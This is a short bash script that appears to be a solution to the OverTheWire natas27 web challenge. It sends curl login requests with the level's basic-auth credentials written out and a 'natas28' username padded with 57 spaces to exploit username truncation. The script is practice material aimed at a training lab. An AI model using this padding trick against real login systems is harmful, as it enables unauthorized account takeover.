#!/bin/bash

curl -u "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" \
	-H "Cookie: PHPSESSID=alterschwede" \
	--data-urlencode "username=natas28$(printf '%57s.')" \
	-d "password=lol" \
	"http://natas27.natas.labs.overthewire.org" \
	| batcat -l html

sleep 1
curl -u "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" \
	--data-urlencode "username=natas28$(printf "%57s")" \
	-d "password=lol" \
	"http://natas27.natas.labs.overthewire.org" \
	| batcat -l html
